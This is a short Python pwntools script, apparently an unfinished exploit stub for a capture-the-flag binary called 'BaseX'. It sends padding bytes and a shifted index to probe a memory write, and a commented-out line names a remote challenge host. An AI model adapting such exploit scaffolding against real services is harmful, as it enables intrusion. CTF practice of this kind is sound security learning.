#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *

context(arch="amd64", os="linux", endian="little")
context.log_level="DEBUG"


class Pwn:
    def __init__(self):
        self.libc = ELF("./libc.so.6")
        self.e = ELF("./BaseX")
        self.p = None

    def start_binary(self):
        self.p = process(["./BaseX"])
        self.p.interactive()
#        self.p = remote("basex.challs.malice.fr", 4444)

    def store_value(self, value, index):
        self.p.send(value)
        self.p.send("0"*6+str(index<<32))

    def pwn_binary(self):
        self.start_binary()

        self.store_value("\x41"*20, 0x205)

        self.p.close()


def main():
    pwn = Pwn()
    pwn.pwn_binary()


if __name__ == "__main__":
    main()
